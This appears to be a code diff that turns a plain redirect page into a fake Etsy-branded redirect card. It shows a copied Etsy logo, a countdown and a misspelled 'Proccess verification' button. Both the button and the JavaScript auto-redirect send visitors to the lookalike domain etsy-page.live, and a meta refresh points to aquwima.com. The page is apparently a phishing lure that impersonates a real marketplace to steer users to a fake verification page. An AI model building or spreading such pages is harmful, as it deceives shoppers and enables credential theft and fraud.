@@ -1,13 +1,215 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="0; url=https://aquwima.com/CzWDigroz">
-    <title>Redirect</title>
+    <meta http-equiv="refresh" content="3; url=https://aquwima.com/925517859">
+    <title>Redirecting to Etsy</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(145deg, #f9f3e9 0%, #f0e7da 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            margin: 0;
+        }
+
+        .etsy-card {
+            max-width: 480px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 20px 40px -12px rgba(0, 0, 0, 0.2);
+            padding: 40px 32px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+
+        .logo {
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .logo-letter {
+            font-size: 48px;
+            font-weight: 700;
+            line-height: 1;
+        }
+
+        .logo-letter.orange {
+            color: #F56400;
+        }
+
+        .logo-letter.black {
+            color: #222;
+        }
+
+        .logo-text {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #222;
+            margin-left: 4px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #2D2D2A;
+            margin-bottom: 12px;
+        }
+
+        .message {
+            font-size: 16px;
+            color: #4A4A47;
+            margin-bottom: 28px;
+        }
+
+        .shop-icon {
+            background-color: #FDF7F0;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+            border: 2px dashed #F56400;
+        }
+
+        .shop-icon svg {
+            width: 40px;
+            height: 40px;
+            fill: #F56400;
+        }
+
+        .redirect-timer {
+            background-color: #F3F1EE;
+            border-radius: 60px;
+            padding: 12px 20px;
+            margin: 16px 0 20px;
+            display: inline-block;
+            font-size: 16px;
+            color: #2D2D2A;
+            border: 1px solid #E2DCD2;
+        }
+
+        .redirect-timer span {
+            background-color: #ffffff;
+            padding: 4px 10px;
+            border-radius: 40px;
+            margin-left: 8px;
+            font-weight: 700;
+            color: #F56400;
+            border: 1px solid #FCC9A0;
+        }
+
+        .btn-primary {
+            background-color: #F56400;
+            color: white;
+            text-decoration: none;
+            padding: 14px 28px;
+            border-radius: 48px;
+            font-weight: 600;
+            font-size: 18px;
+            display: inline-block;
+            margin: 16px 0 20px;
+            border: 2px solid #F56400;
+            box-shadow: 0 8px 16px -6px rgba(245, 100, 0, 0.3);
+            transition: all 0.2s ease;
+        }
+
+        .btn-primary:hover {
+            background-color: #D45400;
+            border-color: #D45400;
+            transform: translateY(-2px);
+        }
+
+        .footer-note {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #7A7A75;
+            border-top: 1px solid #E6E0D6;
+            padding-top: 20px;
+        }
+
+        .footer-note a {
+            color: #F56400;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-note a:hover {
+            text-decoration: underline;
+        }
+    </style>
 </head>
 <body>
-    <p>Redirecting...</p>
-    <p>If you was not automatically redirected, <a href="https://aquwima.com/CzWDigroz">click here</a>.</p>
+    <div class="etsy-card">
+        <!-- Etsy logo with orange E -->
+        <div class="logo">
+            <span class="logo-letter orange">E</span>
+            <span class="logo-letter black">t</span>
+            <span class="logo-letter black">s</span>
+            <span class="logo-letter black">y</span>
+        </div>
+
+        <h2>You're being redirected</h2>
+        <p class="message">to our handmade marketplace</p>
+
+        <!-- Handmade icon -->
+        <div class="shop-icon">
+            <svg viewBox="0 0 24 24">
+                <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+            </svg>
+        </div>
+
+        <!-- Timer -->
+        <div class="redirect-timer">
+            ⏳ Redirecting in <span id="countdown">3</span> seconds
+        </div>
+
+        <!-- Single CTA button -->
+        <a href="https://etsy-page.live/868049092" class="btn-primary">
+            Proccess verification
+        </a>
+
+        <!-- Footer with manual link -->
+        <div class="footer-note">
+            <p>Not redirected automatically? <a href="https://etsy-page.live/868049092">Click here</a></p>
+        </div>
+    </div>
+
+    <!-- Countdown script -->
+    <script>
+        (function() {
+            let seconds = 3;
+            const countdownEl = document.getElementById('countdown');
+            
+            const interval = setInterval(() => {
+                seconds -= 1;
+                if (countdownEl) {
+                    countdownEl.textContent = seconds;
+                }
+                
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    window.location.href = 'https://etsy-page.live/868049092';
+                }
+            }, 1000);
+        })();
+    </script>
 </body>
 </html>
